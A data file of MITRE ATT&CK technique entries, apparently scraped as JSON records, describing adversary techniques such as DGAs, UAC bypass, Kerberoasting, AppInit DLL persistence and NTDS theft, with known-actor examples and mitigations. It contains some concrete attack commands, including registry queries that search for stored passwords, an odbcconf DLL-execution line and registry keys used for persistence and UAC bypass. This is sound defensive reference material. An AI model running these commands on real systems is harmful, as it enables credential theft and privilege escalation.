{"text": " Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019) DGAs can take the form of apparently random or “gibberish” strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation) Adversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)", "idx": "https://attack.mitre.org/techniques/T1568/002", "title": "Domain Generation Algorithms", "entity": "Domain Generation Algorithms", "entity_type": "techniques", "entity_context": ["TA551 has used a DGA to generate URLs from executed macros.", "CCBkdr can use a DGA for Fallback Channels if communications with the primary command and control server are lost.", "MiniDuke can use DGA to generate new Twitter URLs for C2.", "CHOPSTICK can use a DGA for Fallback Channels, domains are generated by concatenating words from lists.", "Aria-body has the ability to use a DGA for C2 communications.", "In some cases a local DNS sinkhole may be used to help prevent DGA-based command and control at a reduced cost.", "Ebury has used a DGA to generate a domain name for C2.", "QakBot can use domain generation algorithms in C2 communication.", "Ngrok can provide DGA for C2 servers through the use of random URL strings that change every 12 hours.", "BONDUPDATER uses a DGA to communicate with command and control servers.", "Ursnif has used a DGA to generate domain names for C2.", "Grandoreiro can use a DGA for hiding C2 addresses, including use of an algorithm with a user-specific key that changes daily.", "ShadowPad uses a DGA that is based on the day of the month for C2 servers.", "SombRAT can use a custom DGA to generate a subdomain for C2.", "APT41 has used DGAs to change their C2 servers monthly.", "Bazar can implement DGA using the current date as a seed variable.", "Astaroth has used a DGA in C2 communications.", "POSHSPY uses a DGA to derive command and control URLs from a word list.", "Conficker has used a DGA that seeds with the current UTC victim system date to generate domains.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Malware researchers can reverse engineer malware variants that use DGAs and determine future domains that the malware will attempt to contact, but this is a time and resource intensive effort. Malware is also increasingly incorporating seed values that can be unique for each instance, which would then need to be determined to extract future generated domains. In some cases, the seed that a particular sample uses can be extracted from DNS traffic. Even so, there can be thousands of possible domains generated per day; this makes it impractical for defenders to preemptively register all possible C2 domains due to the cost.", "Doki has used the DynDNS service and a DGA based on the Dogecoin blockchain to generate C2 domains."], "is_subtechnique": true}
{"text": " Adversaries may bridge network boundaries by modifying a network device’s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks. Network devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device. A typical example of this is environments where internal networks make use of non-Internet routable addresses.(Citation: RFC1918) When an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design. In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device. In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders. Adversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities", "idx": "https://attack.mitre.org/techniques/T1599/001", "title": "Network Address Translation Traversal", "entity": "Network Address Translation Traversal", "entity_type": "techniques", "entity_context": ["Refer to NIST guidelines when creating password policies. ", "Block Traffic\tUpon identifying a compromised network device being used to bridge a network boundary, block the malicious packets using an unaffected network device in path, such as a firewall or a router that has not been compromised.  Continue to monitor for additional activity and to ensure that the blocks are indeed effective.", "Some embedded network devices are capable of storing passwords for local accounts in either plain-text or encrypted formats.  Ensure that, where available, local passwords are always encrypted, per vendor recommendations. ", "Restrict administrator accounts to as few individuals as possible, following least privilege principles.  Prevent credential overlap across systems of administrator and privileged accounts, particularly between network and non-network platforms, such as servers or endpoints.", "Use multi-factor authentication for user and privileged accounts. Most embedded network devices support TACACS+ and/or RADIUS.  Follow vendor prescribed best practices for hardening access control. "], "is_subtechnique": true}
{"text": " Adversaries may add new domain trusts or modify the properties of existing domain trusts to evade defenses and/or elevate privileges. Domain trust details, such as whether or not a domain is federated, allow authentication and authorization properties to apply between domains for the purpose of accessing shared resources.(Citation: Microsoft - Azure AD Federation) These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains. Manipulating the domain trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, this may be used to forge [SAML Tokens](https://attack.mitre.org/techniques/T1606/002), without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate.", "idx": "https://attack.mitre.org/techniques/T1484/002", "title": "Domain Trust Modification", "entity": "Domain Trust Modification", "entity_type": "techniques", "entity_context": ["APT29 changed domain federation trust settings using Azure AD administrative permissions to configure the domain to accept authorization tokens signed by their own SAML signing certificate.", "Use the principal of least privilege and protect administrative access to domain trusts."], "is_subtechnique": true}
{"text": " Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppInit_DLLs</code> value in the Registry keys <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> or <code>HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Elastic Process Injection July 2017) Similar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry) Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot)", "idx": "https://attack.mitre.org/techniques/T1546/010", "title": "AppInit DLLs", "entity": "AppInit DLLs", "entity_type": "techniques", "entity_context": ["Upgrade to Windows 8 or later and enable secure boot.", "If a victim meets certain criteria, T9000 uses the AppInit_DLL functionality to achieve persistence by ensuring that every user mode process that is spawned will load its malicious DLL, ResN32.dll. It does this by creating the following Registry keys: <code>HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs – %APPDATA%\\Intel\\ResN32.dll</code> and <code>HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\LoadAppInit_DLLs – 0x1</code>.", "Some variants of Cherry Picker use AppInit_DLLs to achieve persistence by creating the following Registry key: <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows \"AppInit_DLLs\"=\"pserver32.dll\"</code>", "Ramsay can insert itself into the address space of other applications using the AppInit DLL Registry key.\t", "APT39 has used malware to set <code>LoadAppInit_DLLs</code> in the Registry key <code>SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> in order to establish persistence.", "Adversaries can install new AppInit DLLs binaries to execute this technique. Identify and block potentially malicious software executed through AppInit DLLs functionality by using application control  tools, like Windows Defender Application Control, AppLocker,   or Software Restriction Policies  where appropriate. "], "is_subtechnique": true}
{"text": " Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise can take place at any stage of the supply chain including: * Manipulation of development tools * Manipulation of a development environment * Manipulation of source code repositories (public or private) * Manipulation of source code in open-source dependencies * Manipulation of software update/distribution mechanisms * Compromised/infected system images (multiple cases of removable media infected at the factory) (Citation: IBM Storwize) (Citation: Schneider Electric USB Malware) * Replacement of legitimate software with modified versions * Sales of modified/counterfeit products to legitimate distributors * Shipment interdiction While supply chain compromise can impact any component of hardware or software, attackers looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels. (Citation: Avast CCleaner3 2018) (Citation: Microsoft Dofoil 2018) (Citation: Command Five SK 2011) Targeting may be specific to a desired victim set (Citation: Symantec Elderwood Sept 2012) or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. (Citation: Avast CCleaner3 2018) (Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency. (Citation: Trendmicro NPM Compromise)", "idx": "https://attack.mitre.org/techniques/T1195", "title": "Supply Chain Compromise", "entity": "Supply Chain Compromise", "entity_type": "techniques", "entity_context": ["A patch management process should be implemented to check unused dependencies, unmaintained and/or previously vulnerable dependencies, unnecessary features, components, files, and documentation.", "Continuous monitoring of vulnerability sources and the use of automatic and manual code review tools should also be implemented as well."], "is_subtechnique": false}
{"text": " An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566). While [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).", "idx": "https://attack.mitre.org/techniques/T1204", "title": "User Execution", "entity": "User Execution", "entity_type": "techniques", "entity_context": ["Application control may be able to prevent the running of executables masquerading as other files.", "Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events.", "If a link is being visited by a user, block unknown or unused files in transit by default that should not be downloaded or by policy from suspicious sites as a best practice to prevent some vectors, such as .scr, .exe, .pif, .cpl, etc. Some download scanning devices can open and analyze compressed and encrypted formats, such as zip and rar that may be used to conceal malicious files.", "If a link is being visited by a user, network intrusion prevention systems and systems designed to scan and remove malicious downloads can be used to block activity.", "On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent executable files from running unless they meet a prevalence, age, or trusted list criteria and to prevent Office applications from creating potentially malicious executable content by blocking malicious code from being written to disk. Note: cloud-delivered protection must be enabled to use certain rules. "], "is_subtechnique": false}
{"text": " Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process. Proc memory injection involves enumerating the memory of a process via the /proc filesystem (<code>/proc/[pid]</code>) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes’ memory map within <code>/proc/[pid]/maps</code> can be overwritten using dd.(Citation: Uninformed Needle)(Citation: GDS Linux Injection)(Citation: DD Man) Other techniques such as [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) may be used to populate a target process with more available gadgets. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), proc memory injection may target child processes (such as a backgrounded copy of sleep).(Citation: GDS Linux Injection) Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process.", "idx": "https://attack.mitre.org/techniques/T1055/009", "title": "Proc Memory", "entity": "Proc Memory", "entity_type": "techniques", "entity_context": ["Restrict the permissions on sensitive files such as <code>/proc/pid/maps</code> or <code>/proc/pid/mem</code>. ", "Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process. "], "is_subtechnique": true}
{"text": " Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) assemblies. Both are digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm) Both utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)", "idx": "https://attack.mitre.org/techniques/T1218/009", "title": "Regsvcs/Regasm", "entity": "Regsvcs/Regasm", "entity_type": "techniques", "entity_context": ["Regsvcs and Regasm may not be necessary within a given environment.", "Block execution of Regsvcs.exe and Regasm.exe if they are not required for a given system or network to prevent potential misuse by adversaries.", "Agent Tesla has dropped RegAsm.exe onto systems for performing malicious activity. "], "is_subtechnique": true}
{"text": " Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. (Citation: TechNet How UAC Works) If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box. (Citation: TechNet Inside UAC) (Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows) Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as: * <code>eventvwr.exe</code>", "idx": "https://attack.mitre.org/techniques/T1548/002", "title": "Bypass User Account Control", "entity": "Bypass User Account Control", "entity_type": "techniques", "entity_context": ["APT37 has a function in the initial dropper to bypass Windows UAC in order to execute the next payload with higher privileges.", "Grandoreiro can bypass UAC by registering as the default handler for .MSC files.", "PoshC2 can utilize multiple methods to bypass UAC.", "Downdelph bypasses UAC to escalate privileges by using a custom “RedirectEXE” shim database.", "Pupy can bypass Windows UAC through either DLL hijacking, eventvwr, or appPaths.", "ShimRat has hijacked the cryptbase.dll within migwiz.exe to escalate privileges. This prevented the User Access Control window from appearing.", "Shamoon attempts to disable UAC remote restrictions by modifying the Registry.", "Check for common UAC bypass weaknesses on Windows systems to be aware of the risk posture and address issues where appropriate.", "Cobalt Strike can use a number of known techniques to bypass Windows UAC.", "Avaddon bypasses UAC using the CMSTPLUA COM interface. ", "FinFisher performs UAC bypass.", "\nLokibot has utilized multiple techniques to bypass UAC.", "APT29 has bypassed UAC.", "A Threat Group-3390 tool can use a public UAC bypass method to elevate privileges.", "AutoIt backdoor attempts to escalate privileges by bypassing User Access Control.", "Remove users from the local administrator group on systems.", "Bad Rabbit has attempted to bypass UAC and gain elevated administrative privileges.", "BRONZE BUTLER has used a Windows 10 specific tool and xxmm to bypass UAC for privilege escalation.", "An older variant of PLAINTEE performs UAC bypass.", "InvisiMole can use fileless UAC bypass and create an elevated COM object to escalate privileges.", "Patchwork bypassed User Access Control (UAC).", "MuddyWater uses various techniques to bypass UAC.", "BitPaymer can suppress UAC prompts by setting the <code>HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command</code> registry key on Windows 10 or <code>HKCU\\Software\\Classes\\mscfile\\shell\\open\\command</code> on Windows 7 and launching the <code>eventvwr.msc</code> process, which launches BitPaymer with elevated privileges.", "Honeybee uses a combination of NTWDBLIB.dll and cliconfg.exe to bypass UAC protections using DLL hijacking.", "Ramsay can use UACMe for privilege escalation.\t", "Although UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as DLL Search Order Hijacking.", "Evilnum has used PowerShell to bypass UAC.", "H1N1 bypasses user access control by using a DLL hijacking vulnerability in the Windows Update Standalone Installer (wusa.exe).", "BlackEnergy attempts to bypass default User Access Control (UAC) settings by exploiting a backward-compatibility setting found in Windows 7 and later.", "KONNI bypassed UAC with the “AlwaysNotify” settings.", "Cobalt Group has bypassed UAC.", "Empire includes various modules to attempt to bypass UAC for escalation of privileges.", "PipeMon installer can use UAC bypass techniques to install the payload.", "CSPY Downloader can bypass UAC using the SilentCleanup task to execute the binary with elevated privileges.", "WastedLocker can perform a UAC bypass if it is not executed with administrator rights or if the infected host runs Windows Vista or later.", "Koadic has 2 methods for elevating integrity. It can bypass UAC through eventvwr.exe and sdclt.exe.", "Many ZeroT samples can perform UAC bypass by using eventvwr.exe to execute a malicious file.", "AppleJeus has presented the user with a UAC prompt to elevate privileges while installing.", "Sakula contains UAC bypass code for both 32- and 64-bit systems.", "RTM can attempt to run the program as admin, then show a fake error message and a legitimate UAC bypass prompt to the user in an attempt to socially engineer the user into escalating privileges.", "UACMe contains many methods for bypassing Windows User Account Control on multiple versions of the operating system.", "Consider updating Windows to the latest version and patch level to utilize the latest protective measures against UAC bypass.", "Remcos has a command for UAC bypassing."], "is_subtechnique": true}
{"text": " Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins. A variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost Ruler GitHub) These persistence mechanisms can work within Outlook or be used through Office 365.(Citation: TechNet O365 Outlook Rules)", "idx": "https://attack.mitre.org/techniques/T1137", "title": "Office Application Startup", "entity": "Office Application Startup", "entity_type": "techniques", "entity_context": ["Gamaredon Group has inserted malicious macros into existing documents, providing persistence when they are reopened. Gamaredon Group has loaded the group's previously delivered VBA project by relaunching Microsoft Outlook with the <code>/altvba</code> option, once the Application.Startup event is received.", "For the Outlook methods, blocking macros may be ineffective as the Visual Basic engine used for these features is separate from the macro scripting engine. Microsoft has released patches to try to address each issue. Ensure KB3191938 which blocks Outlook Visual Basic and displays a malicious code warning, KB4011091 which disables custom forms by default, and KB4011162 which removes the legacy Home Page feature, are applied to systems.", "APT32 have replaced Microsoft Outlook's VbaProject.OTM file to install a backdoor macro for persistence.", "For the Office Test method, create the Registry key used to execute it and set the permissions to \"Read Control\" to prevent easy access to the key without administrator permissions or requiring Privilege Escalation. ", "Follow Office macro security best practices suitable for your environment. Disable Office VBA macros from executing.\n\nDisable Office add-ins. If they are required, follow best practices for securing them by requiring them to be signed and disabling user notification for allowing add-ins. For some add-ins types (WLL, VBA) additional mitigation is likely required as disabling add-ins in the Office Trust Center does not disable WLL nor does it prevent VBA code from executing. ", "On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Office applications from creating child processes and from writing potentially malicious executable content to disk. "], "is_subtechnique": false}
{"text": " Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) Odbcconf.exe is digitally signed by Microsoft. Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010), odbcconf.exe has a <code>REGSVR</code> flag that can be misused to execute DLLs (ex: <code>odbcconf.exe /S /A &lbrace;REGSVR \"C:\\Users\\Public\\file.dll\"&rbrace;</code>). (Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017)", "idx": "https://attack.mitre.org/techniques/T1218/008", "title": "Odbcconf", "entity": "Odbcconf", "entity_type": "techniques", "entity_context": ["Use application control configured to block execution of Odbcconf.exe if it is not required for a given system or network to prevent potential misuse by adversaries.", "Cobalt Group has used <code>odbcconf</code> to proxy the execution of malicious DLL files.", "Odbcconf.exe may not be necessary within a given environment."], "is_subtechnique": true}
{"text": " Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016) Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016) This same attack could be executed using service tickets captured from network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015) Cracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)", "idx": "https://attack.mitre.org/techniques/T1558/003", "title": "Kerberoasting", "entity": "Kerberoasting", "entity_type": "techniques", "entity_context": ["Wizard Spider has used Rubeus, MimiKatz Kerberos module, and the Invoke-Kerberoast cmdlet to steal AES hashes.", "Enable AES Kerberos encryption (or another stronger encryption algorithm), rather than RC4, where possible.", "APT29 obtained Ticket Granting Service (TGS) tickets for Active Directory Service Principle Names to crack offline.", "Empire uses PowerSploit's <code>Invoke-Kerberoast</code> to request service tickets and return crackable ticket hashes.", "Ensure strong password length (ideally 25+ characters) and complexity for service accounts and that these passwords periodically expire. Also consider using Group Managed Service Accounts or another third party product such as password vaulting.", "Operation Wocao has used PowerSploit's Invoke-Kerberoast module to request encrypted service tickets and bruteforce the passwords of Windows service accounts offline.", "PowerSploit's <code>Invoke-Kerberoast</code> module can request service tickets and return crackable ticket hashes.", "FIN7 has used Kerberoasting for credential access and to enable lateral movement.", "Impacket modules like GetUserSPNs can be used to get Service Principal Names (SPNs) for user accounts. The output is formatted to be compatible with cracking tools like John the Ripper and Hashcat.", "Limit service accounts to minimal required privileges, including membership in privileged groups such as Domain Administrators."], "is_subtechnique": true}
{"text": " Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons. Example commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials) * Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code> * Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>", "idx": "https://attack.mitre.org/techniques/T1552/002", "title": "Credentials in Registry", "entity": "Credentials in Registry", "entity_type": "techniques", "entity_context": ["APT32 used Outlook Credential Dumper to harvest credentials stored in Windows registry.", "Reg may be used to find credentials in the Windows Registry.", "TrickBot has retrieved PuTTY credentials by querying the <code>Software\\SimonTatham\\Putty\\Sessions</code> registry key ", "PowerSploit has several modules that search the Windows Registry for stored credentials: <code>Get-UnattendedInstallFile</code>, <code>Get-Webconfig</code>, <code>Get-ApplicationHost</code>, <code>Get-SiteListPassword</code>, <code>Get-CachedGPPPassword</code>, and <code>Get-RegistryAutoLogon</code>.", "Proactively search for credentials within the Registry and attempt to remediate the risk.", "If it is necessary that software must store credentials in the Registry, then ensure the associated accounts have limited permissions so they cannot be abused if obtained by an adversary.", "Agent Tesla has the ability to extract credentials from the Registry. ", "Do not store credentials within the Registry.", "Valak can use the clientgrabber module to steal e-mail credentials from the Registry."], "is_subtechnique": true}
{"text": " Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies. (Citation: Writing Bad Malware for OSX) There are tools available to perform these changes. Adversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time. (Citation: Malware Persistence on OS X)", "idx": "https://attack.mitre.org/techniques/T1546/006", "title": "LC_LOAD_DYLIB Addition", "entity": "LC_LOAD_DYLIB Addition", "entity_type": "techniques", "entity_context": ["Binaries can also be baselined for what dynamic libraries they require, and if an app requires a new dynamic library that wasn\\u2019t included as part of an update, it should be investigated.", "Enforce that all binaries be signed by the correct Apple Developer IDs.", "Allow applications via known hashes."], "is_subtechnique": true}
{"text": " Adversaries may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services. Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot.(Citation: Microsoft Safe Mode)(Citation: Sophos Snatch Ransomware 2019) Adversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot. Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data (BCD) stores, which are files that manage boot application settings.(Citation: Microsoft bcdedit 2021) Adversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)). Malicious [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) objects may also be registered and loaded in safe mode.(Citation: Sophos Snatch Ransomware 2019)(Citation: CyberArk Labs Safe Mode 2016)(Citation: Cybereason Nocturnus MedusaLocker 2020)(Citation: BleepingComputer REvil 2021)", "idx": "https://attack.mitre.org/techniques/T1562/009", "title": "Safe Mode Boot", "entity": "Safe Mode Boot", "entity_type": "techniques", "entity_context": ["Ensure that endpoint defenses run in safe mode.", "Restrict administrator accounts to as few individuals as possible, following least privilege principles, that may be abused to remotely boot a machine in safe mode.", "REvil can force a reboot in safe mode with networking."], "is_subtechnique": true}
{"text": " Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access (Citation: Microsoft Change Default Programs) (Citation: Microsoft File Handlers) or by administrators using the built-in assoc utility. (Citation: Microsoft Assoc Oct 2017) Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened. System file associations are listed under <code>HKEY_CLASSES_ROOT\\.[extension]</code>, for example <code>HKEY_CLASSES_ROOT\\.txt</code>. The entries point to a handler for that extension located at <code>HKEY_CLASSES_ROOT\\[handler]</code>. The various commands are then listed as subkeys underneath the shell key at <code>HKEY_CLASSES_ROOT\\[handler]\\shell\\[action]\\command</code>. For example: * <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command</code> * <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command</code> * <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command</code> The values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands. (Citation: TrendMicro TROJ-FAKEAV OCT 2012)", "idx": "https://attack.mitre.org/techniques/T1546/001", "title": "Change Default File Association", "entity": "Change Default File Association", "entity_type": "techniques", "entity_context": ["Kimsuky has a HWP document stealer module which changes the default program association in the registry to open HWP documents."], "is_subtechnique": true}
{"text": " Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\\NTDS\\Ntds.dit</code> of a domain controller.(Citation: Wikipedia Active Directory) In addition to looking for NTDS files on active Domain Controllers, attackers may search for backups that contain the same or similar information.(Citation: Metcalf 2015) The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes. * Volume Shadow Copy * secretsdump.py * Using the in-built Windows tool, ntdsutil.exe * Invoke-NinjaCopy", "idx": "https://attack.mitre.org/techniques/T1003/003", "title": "NTDS", "entity": "NTDS", "entity_type": "techniques", "entity_context": ["Koadic can gather hashed passwords by gathering domain controller hashes from NTDS.", "Limit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts.", "Ensure Domain Controller backups are properly secured.", "CrackMapExec can dump hashed passwords associated with Active Directory using Windows' Directory Replication Services API (DRSUAPI), or Volume Shadow Copy.", "Fox Kitten has used Volume Shadow Copy to access credential information from NTDS.", "Mustang Panda has used vssadmin to create a volume shadow copy and retrieve the NTDS.dit file. Mustang Panda has also used <code>reg save</code> on the SYSTEM file Registry location to help extract the NTDS.dit file.", "Ensure that local administrator accounts have complex, unique passwords across all systems on the network.", "FIN6 